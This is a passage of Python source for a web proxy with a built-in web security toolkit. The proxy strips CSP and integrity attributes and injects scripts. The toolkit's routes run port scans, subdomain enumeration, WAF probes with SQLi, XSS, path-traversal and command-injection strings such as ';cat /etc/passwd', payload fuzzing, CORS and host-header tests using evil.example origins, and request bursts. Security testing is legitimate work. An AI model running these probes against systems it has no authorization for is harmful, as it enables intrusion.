    document.body.appendChild(el);
    toasts.push(el);
    setTimeout(function(){
      el.remove(); toasts = toasts.filter(function(x){return x!==el});
    }, ms);
  }
  function withLoader(btn, p){
    if (!btn) return p;
    var orig = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<span style="display:inline-flex;align-items:center;gap:8px">'
      +'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" '
      +'style="animation:__lynkspin .9s linear infinite"><circle cx="12" cy="12" r="9" '
      +'stroke="currentColor" stroke-width="3" stroke-dasharray="40 60" stroke-linecap="round"/></svg>'
      +'<span>Working…</span></span>';
    if (!document.getElementById('__lynkkf')){
      var s = document.createElement('style'); s.id = '__lynkkf';
      s.textContent = '@keyframes __lynkspin{from{transform:rotate(0)}to{transform:rotate(360deg)}}';
      document.head.appendChild(s);
    }
    return Promise.resolve(p).finally(function(){
      btn.disabled = false; btn.innerHTML = orig;
    });
  }
  function skeleton(rows){
    rows = rows || 4;
    var out = '';
    for (var i=0;i<rows;i++){
      out += '<div style="height:14px;margin-bottom:12px;border-radius:6px;'
        +'background:linear-gradient(90deg,rgba(148,163,184,.08),rgba(148,163,184,.18),rgba(148,163,184,.08));'
        +'background-size:800px 100%;animation:__lynkskel 1.6s infinite linear;'
        +'width:'+(100 - i*8)+'%"></div>';
    }
    if (!document.getElementById('__lynkskelkf')){
      var s2 = document.createElement('style'); s2.id = '__lynkskelkf';
      s2.textContent = '@keyframes __lynkskel{0%{background-position:-400px 0}100%{background-position:400px 0}}';
      document.head.appendChild(s2);
    }
    return out;
  }
  return { toast: toast, withLoader: withLoader, skeleton: skeleton };
})();
"""


# ======================================================================
# Proxy engine
# ======================================================================
class ProxyEngine:
    def __init__(self, target_url, incoming, method="GET", body=b"", cookie_header=""):
        self.target_url = target_url
        self.incoming = {k.lower(): v for k, v in (incoming or {}).items()}
        self.method = method.upper()
        self.body = body or b""
        self.cookie_header = cookie_header
        self.final_url = target_url

    async def fetch(self):
        parsed = urlparse(self.target_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        headers = dict(BROWSER_HEADERS)
        headers["Referer"] = extract_upstream(self.incoming.get("referer","")) or (origin + "/")
        for k,v in self.incoming.items():
            if k in FORWARD_REQUEST_HEADERS and v: headers[k] = v
        if self.cookie_header: headers["Cookie"] = self.cookie_header
        if self.method in ("POST","PUT","PATCH") and self.body:
            ct = self.incoming.get("content-type")
            if ct: headers["Content-Type"] = ct
        send_body = self.body if self.method in ("POST","PUT","PATCH","DELETE") else None
        resp = await app.fetch(self.target_url, method=self.method, headers=headers,
                               body=send_body, timeout=FETCH_TIMEOUT, allow_redirects=True,
                               max_redirects=MAX_REDIRECTS, prefer_http2=True,
                               use_doh=True, connect_retries=2)
        raw = resp.content
        enc = resp.headers.get("content-encoding","")
        if enc: raw = decode_body(raw, enc)
        self.final_url = resp.url or self.target_url
        return raw, resp.status_code, dict(resp.headers), self.final_url

    def _rw_srcset(self, srcset, base):
        out = []
        for entry in srcset.split(","):
            entry = entry.strip()
            if not entry: continue
            parts = entry.split(None, 1)
            u = parts[0]; tail = parts[1] if len(parts) > 1 else ""
            if skip_url(u): out.append(entry); continue
            absu = urljoin(base, u)
            out.append(f"{proxy_url(absu)} {tail}".strip() if tail else proxy_url(absu))
        return ", ".join(out)

    def _rw_css(self, css, base):
        def sub_url(m):
            inner = m.group(1).strip().strip("'\"")
            if not inner: return m.group(0)
            if inner.startswith("//"): return f"url('{proxy_url(urljoin(base, inner))}')"
            if skip_url(inner): return m.group(0)
            return f"url('{proxy_url(urljoin(base, inner))}')"
        def sub_import(m):
            q, inner = m.group(1), m.group(2).strip()
            if skip_url(inner) or inner.startswith("//"): return m.group(0)
            return f"@import {q}{proxy_url(urljoin(base, inner))}{q}"
        css = re.sub(r"url\(\s*([^)]+?)\s*\)", sub_url, css)
        css = re.sub(r"""@import\s+(["'])([^"']+)\1""", sub_import, css)
        return css

    def rewrite_html(self, raw, base_url, ctype, ctx):
        charset = detect_charset(ctype, raw)
        try: text = raw.decode(charset, errors="replace")
        except LookupError: text = raw.decode("utf-8", errors="replace")
        try: soup = BeautifulSoup(text, "html.parser")
        except Exception: return raw
        base = base_url
        for tag in soup.find_all("base"): tag.decompose()
        for meta in soup.find_all("meta"):
            if (meta.get("http-equiv") or "").lower().startswith("content-security"):
                meta.decompose()
        for tag in soup.find_all(["a","link","area"], href=True):
            h = tag["href"]
            if not skip_url(h): tag["href"] = proxy_url(urljoin(base, h))
        for tag in soup.find_all(
            ["img","script","iframe","embed","source","video","audio","track","input"], src=True):
            s = tag["src"]
            if not skip_url(s): tag["src"] = proxy_url(urljoin(base, s))
        for tag in soup.find_all("object", data=True):
            d = tag["data"]
            if not skip_url(d): tag["data"] = proxy_url(urljoin(base, d))
        for attr in ("data-src","data-original","data-lazy-src"):
            for tag in soup.find_all(attrs={attr: True}):
                v = tag[attr]
                if not skip_url(v): tag[attr] = proxy_url(urljoin(base, v))
        for attr in ("srcset","data-srcset"):
            for tag in soup.find_all(attrs={attr: True}):
                tag[attr] = self._rw_srcset(tag[attr], base)
        for tag in soup.find_all("video", poster=True):
            p = tag["poster"]
            if not skip_url(p): tag["poster"] = proxy_url(urljoin(base, p))
        for form in soup.find_all("form"):
            method = (form.get("method") or "get").lower()
            action = form.get("action") or base
            absu = urljoin(base, action)
            if method == "get":
                form["action"] = "/proxy"
                for ex in form.find_all("input", attrs={"name":"url"}): ex.decompose()
                h = soup.new_tag("input")
                h["type"] = "hidden"; h["name"] = "url"; h["value"] = absu
                form.append(h)
            else:
                form["action"] = proxy_url(absu)
        for tag in soup.find_all(style=True):
            tag["style"] = self._rw_css(tag["style"], base)
        for st in soup.find_all("style"):
            if st.string: st.string = self._rw_css(st.string, base)
        for meta in soup.find_all("meta"):
            if (meta.get("http-equiv") or "").lower() == "refresh":
                content = meta.get("content","")
                m = re.search(r"url\s*=\s*([^;]+)", content, re.I)
                if m:
                    u = m.group(1).strip().strip("'\"")
                    if not skip_url(u):
                        meta["content"] = re.sub(r"url\s*=\s*[^;]+",
                                                 f"url={proxy_url(urljoin(base, u))}",
                                                 content, flags=re.I)
        for tag in soup.find_all(["script","link"]):
            tag.attrs.pop("integrity", None)
            tag.attrs.pop("crossorigin", None)
            tag.attrs.pop("nonce", None)
        head = soup.head or soup.new_tag("head")
        if not soup.head: soup.insert(0, head)
        boot = soup.new_tag("script")
        boot.string = ("if('serviceWorker' in navigator&&!window.__LYNK_SW__){"
            "window.__LYNK_SW__=1;"
            "navigator.serviceWorker.register('/__lynk_sw.js',{scope:'/'})"
            ".catch(function(e){console.warn('sw:',e)})}")
        head.insert(0, boot)
        target = soup.body or soup.html or soup
        ctx_s = soup.new_tag("script")
        ctx_s.string = f"window.__LYNK_CTX__={json.dumps(ctx)};"
        target.insert(0, ctx_s)
        icpt = soup.new_tag("script")
        icpt.string = INTERCEPTOR_JS
        target.insert(1, icpt)
        ui = soup.new_tag("script")
        ui.string = UI_SHELL_JS
        target.insert(2, ui)
        for snip in ctx.get("_injected", []):
            s = soup.new_tag("script"); s.string = snip; target.append(s)
        panel = soup.new_tag("script"); panel["src"] = "/tool/panel.js"; target.append(panel)
        return str(soup).encode("utf-8", errors="ignore")

    def rewrite_css(self, raw, base_url, ctype):
        charset = detect_charset(ctype, raw)
        try: text = raw.decode(charset, errors="replace")
        except LookupError: text = raw.decode("utf-8", errors="replace")
        return self._rw_css(text, base_url).encode("utf-8")


async def serve_proxied(req, target_url, sid):
    sess = get_session(sid)
    parsed = urlparse(target_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    if is_self_target(req, target_url):
        recovered = ""
        if sess.last_origin:
            ro = urlparse(sess.last_origin)
            if _norm_host(ro.netloc) != _norm_host(parsed.netloc):
                recovered = f"{ro.scheme}://{ro.netloc}{parsed.path}"
                if parsed.query: recovered += "?" + parsed.query
        if recovered:
            parsed = urlparse(recovered)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            target_url = recovered
        else:
            return error_page("Refusing to proxy to itself",
                              f"<code>{esc(target_url)}</code> resolves to this proxy.", 508)
    sess.last_origin = origin
    if target_url in sess.source_cache:
        return RawResponse(sess.source_cache[target_url],
                           content_type="text/html; charset=utf-8")
    sess.cookies.merge(origin, req.headers.get("cookie",""))
    ch = sess.cookies.header_for(origin)
    engine = ProxyEngine(target_url, req.headers, method=req.method,
                        body=req.body, cookie_header=ch)
    try:
        content, status, headers, final = await engine.fetch()
    except Exception as exc:
        log.exception(f"fetch failed: {target_url}")
        return error_page("Fetch failed", f"{type(exc).__name__}: {exc}", 502)
    sess.history.append({"url":final,"status":status,"method":req.method,"ts":time.time()})
    for ck in headers.get("set-cookie","").split("\n"):
        if ck.strip(): sess.cookies.add(origin, rewrite_set_cookie(ck.strip()))
    ctype = headers.get("content-type","application/octet-stream")
    low = ctype.lower()
    resp = RawResponse(b"", status=status, content_type=ctype)
    for k,v in headers.items():
        if k in FORWARD_RESPONSE_HEADERS: resp.add_header(k.title(), v)
    resp.add_header("Set-Cookie",
                    f"{SESSION_COOKIE}={sid}; Path=/; Max-Age=86400; SameSite=Lax")
    resp.add_header("Set-Cookie",
                    f"{ORIGIN_COOKIE}={quote(origin, safe='')}; Path=/; Max-Age=86400; SameSite=Lax")
    if status >= 400 and "text/html" not in low:
        return error_page(f"Upstream {status}", f"Target returned status {status}.", 502)
    if "text/html" in low or "application/xhtml" in low:
        if len(content) > MAX_REWRITE_BYTES:
            resp.body = content; return resp
        ctx = {"upstream":final,"sid":sid,
               "_injected":[s["code"] for s in sess.injected if s["enabled"]]}
        resp.body = engine.rewrite_html(content, final, ctype, ctx)
        resp.set_header("Content-Type","text/html; charset=utf-8")
        return resp
    if "text/css" in low:
        resp.body = engine.rewrite_css(content, final, ctype)
        resp.set_header("Content-Type","text/css; charset=utf-8")
        return resp
    resp.body = content
    return resp


# ======================================================================
# Routes
# ======================================================================
@app.get("/")
async def index(req):
    sid, is_new = session_from_req(req)
    opts = "".join(f'<option value="{k}">{esc(v[0])}</option>'
                   for k, v in SEARCH_ENGINES.items())
    html = HOME_HTML.replace("__OPTS__", opts).replace("__VERSION__", framework_version)
    resp = RawResponse(html, content_type="text/html; charset=utf-8")
    if is_new:
        resp.add_header("Set-Cookie",
                        f"{SESSION_COOKIE}={sid}; Path=/; Max-Age=86400; SameSite=Lax")
    return resp


@app.get("/tabs")
async def tabs_page(req):
    sid, is_new = session_from_req(req)
    opts = "".join(f'<option value="{k}">{esc(v[0])}</option>'
                   for k, v in SEARCH_ENGINES.items())
    engines_json = json.dumps({k: v[0] for k, v in SEARCH_ENGINES.items()})
    html = TABS_HTML.replace("__OPTS__", opts).replace("__ENGINES_JSON__", engines_json)
    resp = RawResponse(html, content_type="text/html; charset=utf-8")
    if is_new:
        resp.add_header("Set-Cookie",
                        f"{SESSION_COOKIE}={sid}; Path=/; Max-Age=86400; SameSite=Lax")
    return resp


@app.get("/tool/kit.js")
async def kit_js(req):
    return RawResponse(KIT_JS,
                       content_type="application/javascript; charset=utf-8",
                       headers={"Cache-Control": "no-cache"})


@app.get("/tool/panel.js")
async def panel_js(req):
    return RawResponse(PANEL_JS,
                       content_type="application/javascript; charset=utf-8",
                       headers={"Cache-Control": "no-cache"})


@app.get("/tool/tabbar.js")
async def tabbar_js(req):
    engines = json.dumps({k: v[0] for k, v in SEARCH_ENGINES.items()})
    script = f"window.__LYNK_ENGINES__ = {engines};\n" + TABBAR_JS
    return RawResponse(script,
                       content_type="application/javascript; charset=utf-8",
                       headers={"Cache-Control": "no-cache"})


@app.get("/__lynk_sw.js")
async def lynk_sw(req):
    return RawResponse(SERVICE_WORKER_JS,
                       content_type="application/javascript; charset=utf-8",
                       headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-cache"})


@app.get("/tool/dirview")
async def tool_dirview(req):
    url = req.query_params.get("url") or ""
    if not url:
        return json_response({"error": "missing url"}, status=400)
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=25.0,
                            allow_redirects=True, max_redirects=3,
                            prefer_http2=True, use_doh=True, connect_retries=2)
        hdrs = dict(r.headers); raw = r.content
        if hdrs.get("content-encoding"): raw = decode_body(raw, hdrs["content-encoding"])
        ctype = hdrs.get("content-type",""); low = ctype.lower()
        if any(k in low for k in ("text","json","html","xml","javascript")):
            charset = detect_charset(ctype, raw)
            try: body = raw.decode(charset, errors="replace")
            except LookupError: body = raw.decode("utf-8", errors="replace")
            entries = []
            if "html" in low:
                try:
                    soup = BeautifulSoup(body, "html.parser")
                    seen = set()
                    for a in soup.find_all("a", href=True):
                        href = a["href"]
                        if href in seen or href.startswith(("#","javascript:","mailto:")): continue
                        seen.add(href)
                        absu = urljoin(url, href)
                        is_dir = href.endswith("/") or a.get_text("",strip=True).endswith("/")
                        entries.append({"name": a.get_text("",strip=True)[:120] or href[:120],
                                        "url": absu, "type": "dir" if is_dir else "link",
                                        "size": ""})
                except Exception: pass
            if entries:
                return json_response({"kind": "listing", "entries": entries, "content_type": ctype})
            return json_response({"kind": "text", "body": body[:200000], "content_type": ctype})
        return json_response({"kind": "binary", "size": len(raw), "content_type": ctype})
    except Exception as e:
        return json_response({"error": f"{type(e).__name__}: {e}"}, status=502)


@app.get("/tool/fetch")
async def tool_fetch(req):
    url = req.query_params.get("url") or ""
    dl_flag = req.query_params.get("dl")
    if not url:
        return RawResponse("missing url", status=400, content_type="text/plain")
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=40.0,
                            allow_redirects=True, max_redirects=3,
                            prefer_http2=True, use_doh=True, connect_retries=2)
        raw = r.content; hdrs = dict(r.headers)
        if hdrs.get("content-encoding"): raw = decode_body(raw, hdrs["content-encoding"])
        ctype = hdrs.get("content-type","application/octet-stream")
        headers = {}
        if dl_flag:
            name = url.split("/")[-1].split("?")[0] or "download"
            headers["Content-Disposition"] = f'attachment; filename="{name}"'
        return RawResponse(raw, status=r.status_code, content_type=ctype,
                           headers=headers or None)
    except Exception as e:
        return RawResponse(f"Fetch failed: {e}", status=502, content_type="text/plain")


@app.post("/tool/subdomains")
async def tool_subdomains(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    domain = (fields.get("domain") or "").strip().lower()
    if not domain:
        return json_response({"error": "missing domain"}, status=400)
    out = set()
    try:
        r = await app.fetch(f"https://crt.sh/?q=%25.{domain}&output=json",
            headers={"Accept":"application/json","User-Agent":BROWSER_HEADERS["User-Agent"]},
            timeout=25.0, prefer_http2=True, use_doh=True)
        if r.status_code == 200:
            for entry in json.loads(r.text):
                for line in (entry.get("name_value","") or "").split("\n"):
                    line = line.strip().lower()
                    if line.endswith(domain) and "*" not in line:
                        out.add(line)
    except Exception as e:
        log.debug(f"crt.sh: {e}")
    return json_response({"domain": domain, "subdomains": sorted(out)})


@app.post("/tool/portscan")
async def tool_portscan(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    host = (fields.get("host") or "").strip()
    if not host:
        return json_response({"error": "missing host"}, status=400)
    common = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,993,995,
              1433,1521,2082,2083,2086,2087,2095,2096,3000,3306,3389,5432,
              5672,5900,6379,8000,8008,8080,8081,8082,8086,8443,8888,9000,
              9090,9200,9300,10000,11211,27017,50000]
    sem = asyncio.Semaphore(64)
    async def check(p):
        async with sem:
            try:
                r,w = await asyncio.wait_for(asyncio.open_connection(host, p), timeout=2.0)
                try: w.close(); await w.wait_closed()
                except Exception: pass
                return p
            except Exception: return None
    results = await asyncio.gather(*[check(p) for p in common])
    open_ports = sorted([p for p in results if p])
    return json_response({"host": host, "open": [{"port": p, "service": ""} for p in open_ports]})


@app.post("/tool/ssltls")
async def tool_ssltls(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    p = urlparse(url)
    host = p.hostname; port = p.port or 443
    try:
        ctx = _ssl.create_default_context()
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx, server_hostname=host), timeout=10.0)
        cert = writer.get_extra_info("peercert")
        cipher = writer.get_extra_info("cipher")
        ssl_obj = writer.get_extra_info("ssl_object")
        alpn = ssl_obj.selected_alpn_protocol() if ssl_obj else None
        version = ssl_obj.version() if ssl_obj else None
        try: writer.close(); await writer.wait_closed()
        except Exception: pass
        subject = {}; issuer = {}
        for tup in cert.get("subject", []):
            for k, v in tup: subject[k] = v
        for tup in cert.get("issuer", []):
            for k, v in tup: issuer[k] = v
        return json_response({
            "subject": subject, "issuer": issuer,
            "serial": cert.get("serialNumber"),
            "not_before": cert.get("notBefore"),
            "not_after": cert.get("notAfter"),
            "subject_alt_names": [v for k,v in cert.get("subjectAltNames", [])],
            "version": version, "cipher": cipher, "alpn": alpn,
        })
    except Exception as e:
        return json_response({"error": f"{type(e).__name__}: {e}"})


@app.post("/tool/waf")
async def tool_waf(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    probes = [("?id=1%27%20OR%20%271%27%3D%271","SQLi"),
              ("?q=<script>alert(1)</script>","XSS"),
              ("?file=../../../../etc/passwd","LFI"),
              ("?cmd=;cat%20/etc/passwd","RCE")]
    p = urlparse(url); base = f"{p.scheme}://{p.netloc}{p.path}"
    waf_sigs = {"cloudflare":["cf-ray","cloudflare"],"akamai":["akamai"],
                "aws-waf":["awselb","x-amz-cf"],"sucuri":["x-sucuri"],
                "imperva":["imperva","incap_ses"],"f5-bigip":["bigip"],
                "fastly":["fastly"],"barracuda":["barra"],
                "modsecurity":["mod_security"],"wordfence":["wordfence"]}
    results = []
    for payload, label in probes:
        try:
            r = await app.fetch(base + payload, headers=BROWSER_HEADERS,
                                timeout=10.0, allow_redirects=False,
                                max_redirects=0, prefer_http2=False, use_doh=True)
            hdrs = " ".join([f"{k}:{v}" for k,v in r.headers.items()]).lower()
            server = r.headers.get("server","")
            blocked = r.status_code in (403,406,419,429,501,503)
            matched = None
            for waf, sigs in waf_sigs.items():
                if any(s in hdrs for s in sigs): matched = waf; break
            results.append({"payload":payload,"label":label,"status":r.status_code,
                            "blocked":blocked,"waf":matched,"server":server})
        except Exception as e:
            results.append({"payload":payload,"label":label,"error":str(e)})
    detected = list({r["waf"] for r in results if r.get("waf")})
    return json_response({"detected": detected, "probes": results})


@app.post("/tool/wayback")
async def tool_wayback(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    try:
        api_url = ("https://web.archive.org/cdx/search/cdx"
                   f"?url={quote(url, safe='')}&output=json&limit=30"
                   "&filter=statuscode:200&collapse=digest")
        r = await app.fetch(api_url, headers=BROWSER_HEADERS, timeout=20.0,
                            prefer_http2=True, use_doh=True)
        rows = json.loads(r.text) if r.status_code == 200 else []
        snapshots = []
        if rows and len(rows) > 1:
            for row in rows[1:]:
                ts = row[1] if len(row) > 1 else ""
                orig = row[2] if len(row) > 2 else url
                if ts:
                    snapshots.append({"timestamp": ts,
                                      "url": f"https://web.archive.org/web/{ts}/{orig}"})
        snapshots.reverse()
        return json_response({"snapshots": snapshots})
    except Exception as e:
        return json_response({"error": str(e)}, status=502)


@app.post("/tool/favicon")
async def tool_favicon(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    p = urlparse(url)
    base = f"{p.scheme}://{p.netloc}"
    for path in ("/favicon.ico", "/favicon.png", "/apple-touch-icon.png"):
        try:
            r = await app.fetch(base + path, headers=BROWSER_HEADERS, timeout=10.0,
                                allow_redirects=True, max_redirects=2,
                                prefer_http2=True, use_doh=True)
            if r.status_code == 200 and r.content:
                b64 = base64.encodebytes(r.content).decode()
                fingerprint = hashlib.sha256(b64.replace("\n","").encode()).hexdigest()[:32]
                return json_response({
                    "url": base + path,
                    "bytes": len(r.content),
                    "sha256": hashlib.sha256(r.content).hexdigest(),
                    "shodan_style_fp": fingerprint,
                })
        except Exception: continue
    return json_response({"error": "no favicon found"})


@app.post("/tool/dns-deep")
async def tool_dns_deep(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    host = urlparse(url).hostname or url
    out = {"host": host}
    try:
        loop = asyncio.get_running_loop()
        out["a"] = sorted({i[4][0] for i in await loop.getaddrinfo(
            host, None, family=socket.AF_INET, type=socket.SOCK_STREAM)})
    except Exception as e:
        out["a_error"] = str(e)
    try:
        loop = asyncio.get_running_loop()
        out["aaaa"] = sorted({i[4][0] for i in await loop.getaddrinfo(
            host, None, family=socket.AF_INET6, type=socket.SOCK_STREAM)})
    except Exception as e:
        out["aaaa_error"] = str(e)
    return json_response(out)


@app.post("/tool/hsts-audit")
async def tool_hsts_audit(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    p = urlparse(url)
    if p.scheme != "https":
        return json_response({"error": "HSTS only applies to https"})
    try:
        r = await app.fetch(url, headers=BROWSER_HEADERS, timeout=15.0,
                            allow_redirects=False, max_redirects=0,
                            prefer_http2=True, use_doh=True)
        hsts = r.headers.get("strict-transport-security","")
        return json_response({
            "hsts_header": hsts,
            "present": bool(hsts),
            "has_include_subdomains": "includesubdomains" in hsts.lower(),
            "has_preload": "preload" in hsts.lower(),
            "max_age": (re.search(r"max-age=(\d+)", hsts).group(1) if "max-age" in hsts else None),
        })
    except Exception as e:
        return json_response({"error": str(e)}, status=502)


@app.post("/tool/well-known")
async def tool_well_known(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    p = urlparse(url); base = f"{p.scheme}://{p.netloc}"
    paths = [
        "/.well-known/security.txt", "/.well-known/change-password",
        "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
        "/.well-known/assetlinks.json", "/.well-known/apple-app-site-association",
        "/.well-known/mta-sts.txt", "/.well-known/dnt-policy.txt",
        "/.well-known/acme-challenge/", "/.well-known/health",
    ]
    sem = asyncio.Semaphore(6)
    async def probe_path(path):
        async with sem:
            try:
                r = await app.fetch(base + path, headers=BROWSER_HEADERS, timeout=8.0,
                                    allow_redirects=False, max_redirects=0,
                                    prefer_http2=True, use_doh=True)
                return {"path": path, "url": base + path,
                        "status": r.status_code, "length": len(r.content)}
            except Exception as e:
                return {"path": path, "url": base + path, "error": str(e), "status": 0}
    results = await asyncio.gather(*[probe_path(p) for p in paths])
    return json_response({"results": results})


@app.post("/tool/api-discover")
async def tool_api_discover(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    p = urlparse(url); base = f"{p.scheme}://{p.netloc}"
    paths = [
        "/api", "/api/v1", "/api/v2", "/api/v3", "/api/users", "/api/user",
        "/api/me", "/api/auth", "/api/login", "/api/logout", "/api/register",
        "/api/config", "/api/health", "/api/status", "/api/version",
        "/api/admin", "/api/search", "/api/data", "/api/items",
        "/rest", "/rest/api", "/graphql", "/rpc",
        "/v1", "/v2", "/v3", "/swagger.json", "/openapi.json",
    ]
    sem = asyncio.Semaphore(8)
    async def probe_path(path):
        async with sem:
            try:
                r = await app.fetch(base + path, headers=BROWSER_HEADERS, timeout=6.0,
                                    allow_redirects=False, max_redirects=0,
                                    prefer_http2=False, use_doh=True)
                return {"path": path, "url": base + path,
                        "status": r.status_code, "length": len(r.content)}
            except Exception as e:
                return {"path": path, "url": base + path, "error": str(e), "status": 0}
    results = await asyncio.gather(*[probe_path(p) for p in paths])
    return json_response({"results": results})


@app.post("/tool/params")
async def tool_params(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    token = "lynk" + uuid.uuid4().hex[:6]
    base = await probe(url, timeout=10.0)
    if not base.get("ok"):
        return json_response({"error": f"baseline failed: {base.get('err')}"})
    names = ["id","user","username","name","q","s","search","query","page","p",
             "file","path","url","redirect","next","return","callback","action",
             "debug","test","admin","token","key","api_key","lang","format","cmd",
             "exec","include","view","template","tpl"]
    sem = asyncio.Semaphore(6)
    async def do(name):
        async with sem:
            r = await probe(url, params={name: token}, timeout=10.0)
            if not r.get("ok"):
                return {"name": name, "error": r.get("err"), "reflected": False, "differs": False}
            reflected = token in r.get("body","")
            differs, diff = diff_signature(base, r)
            return {"name": name, "reflected": reflected, "differs": differs,
                    "status": r["status"], "length": r["length"], "diff": diff}
    results = await asyncio.gather(*[do(n) for n in names])
    return json_response({"baseline": base, "results": results})


@app.post("/tool/injection")
async def tool_injection(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    method = (fields.get("method") or "GET").upper()
    kind = (fields.get("kind") or "").strip()
    param = (fields.get("param") or "").strip()
    header = (fields.get("header") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    if not kind or kind not in PAYLOADS:
        return json_response({"error": f"unknown kind: {kind}"}, status=400)
    payloads = PAYLOADS[kind]
    base = await probe(url, method=method, timeout=10.0)
    if not base.get("ok"):
        return json_response({"error": f"baseline failed: {base.get('err')}"})
    results = []
    for p in payloads:
        try:
            if header:
                r = await probe(url, method=method, headers={header: p}, timeout=10.0)
            elif param:
                if method == "GET":
                    r = await probe(url, method="GET", params={param: p}, timeout=10.0)
                else:
                    r = await probe(url, method="POST",
                                    headers={"Content-Type":"application/x-www-form-urlencoded"},
                                    body=(param + "=" + quote(p, safe="")).encode(),
                                    timeout=10.0)
            else:
                r = await probe(url, method="GET", params={"x": p}, timeout=10.0)
            if not r.get("ok"):
                results.append({"payload": p, "error": r.get("err"), "differs": False})
                continue
            differs, diff = diff_signature(base, r)
            results.append({"payload": p, "status": r["status"], "length": r["length"],
                            "time": r["time"], "differs": differs, "diff": diff})
        except Exception as e:
            results.append({"payload": p, "error": str(e), "differs": False})
    return json_response({"baseline": base, "results": results})


@app.post("/tool/cors-deep")
async def tool_cors_deep(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    p = urlparse(url)
    origins = ["https://evil.example", "https://attacker.test", "null",
               f"https://{p.netloc.split(':')[0]}.evil.example", "http://localhost"]
    findings_list = []
    probes = []
    for o in origins:
        r = await probe(url, headers={**BROWSER_HEADERS, "Origin": o},
                        timeout=10.0, follow_headers=True)
        if not r.get("ok"):
            probes.append({"origin": o, "error": r.get("err")}); continue
        acao = r["headers"].get("access-control-allow-origin","")
        acac = r["headers"].get("access-control-allow-credentials","").lower()
        probes.append({"origin":o,"acao":acao,"acac":acac,"status":r["status"]})
        if acao == "*" and acac == "true":
            findings_list.append({"severity":"critical","name":"Wildcard + credentials",
                             "evidence":"ACAO: * / ACAC: true"})
        elif acao == o and acac == "true":
            findings_list.append({"severity":"high","name":"Reflected origin + credentials",
                             "evidence":f"ACAO: {o} / ACAC: true"})
        elif acao == "null":
            findings_list.append({"severity":"medium","name":"Null origin allowed",
                             "evidence":"ACAO: null"})
    return json_response({"findings": findings_list, "probes": probes})


@app.post("/tool/host-header")
async def tool_host_header(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    if not url:
        return json_response({"error": "missing url"}, status=400)
    variants = [
        ("Host", "evil.example"), ("X-Forwarded-Host", "evil.example"),
        ("X-Host", "evil.example"), ("X-Forwarded-Server", "evil.example"),
        ("Forwarded", "host=evil.example"),
    ]
    results = []
    for header, value in variants:
        r = await probe(url, headers={**BROWSER_HEADERS, header: value},
                        timeout=10.0, follow_headers=True)
        if not r.get("ok"):
            results.append({"header":header,"value":value,"error":r.get("err")}); continue
        reflected = value in r.get("body","")
        results.append({"header":header,"value":value,"status":r["status"],
                        "length":r["length"],"reflected":reflected,
                        "match": value if reflected else ""})
    return json_response({"results": results})


@app.post("/tool/ratelimit")
async def tool_ratelimit(req):
    data = await req.form()
    fields = data["fields"] if isinstance(data, dict) and "fields" in data else data
    url = (fields.get("url") or "").strip()
    n = int(fields.get("n") or 20)
    n = max(5, min(200, n))
    if not url:
        return json_response({"error": "missing url"}, status=400)
    async def hit():
        r = await probe(url, timeout=6.0, follow_headers=True)
        return {"status": r.get("status", 0), "time": r.get("time", 0),
                "headers": r.get("headers", {})}
    results = await asyncio.gather(*[hit() for _ in range(n)])
    rl_headers = {}
    for r in results:
        for k, v in (r.get("headers") or {}).items():
            lk = k.lower()
            if lk.startswith("x-ratelimit") or lk == "retry-after":
                rl_headers[k] = v
    hint = ""
    if any(r["status"] == 429 for r in results):
        hint = "429 seen — rate limiting is enforced"
    elif rl_headers:
        hint = "RateLimit headers present"
    else:
        hint = "No rate limiting observed in this burst"
    return json_response({"results": results, "headers": rl_headers, "hint": hint})


# ======================================================================
# BOUNDED RATE-LIMIT STRESS
# ======================================================================
@app.post("/tool/ratelimit-stress")
async def tool_ratelimit_stress(req):
    """
    Bounded concurrency probe. Finds where the target throttles.
    Hard caps: total ≤ 500, concurrency ≤ 20, rps ≤ 50.
    Honours Retry-After, aborts after N consecutive 429s.
    """
